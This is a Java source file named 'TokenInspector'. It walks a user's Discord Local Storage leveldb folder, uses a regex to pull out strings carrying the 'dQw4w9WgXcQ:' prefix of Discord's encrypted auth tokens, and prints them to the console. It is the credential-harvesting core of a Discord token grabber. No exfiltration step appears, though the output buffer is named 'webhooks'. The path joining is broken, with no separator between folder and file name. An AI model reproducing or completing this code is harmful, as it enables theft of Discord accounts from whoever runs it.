package me.kutuzov.tokeninspector;

import java.io.*;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TokenInspector {
    public static void main(String[] args) {
        List<String> paths = new ArrayList<>();
        paths.add("C:\\Users\\Usuario\\AppData\\Roaming\\Discord\\Local Storage\\leveldb");

        int cx = 0;
        StringBuilder webhooks = new StringBuilder();
        webhooks.append("TOKEN\n");

        try {
            for (String path : paths) {
                File f = new File(path);
                String[] pathnames = f.list();
                if (pathnames == null) continue;

                for (String pathname : pathnames) {
                    try {
                        FileInputStream fstream = new FileInputStream(path + pathname);
                        DataInputStream in = new DataInputStream(fstream);
                        BufferedReader br = new BufferedReader(new InputStreamReader(in));

                        String strLine;
                        while ((strLine = br.readLine()) != null) {

                            Pattern p = Pattern.compile("dQw4w9WgXcQ:[^\"]*");
                            Matcher m = p.matcher(strLine);

                            while (m.find()) {
                                if (cx > 0) {
                                    webhooks.append("\n");
                                }
                                webhooks.append(" ").append(m.group());
                                cx++;
                            }

                        }

                    } catch (Exception ignored) {
                    }
                }
            }
            System.out.println("```" + webhooks.toString() + "```");

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}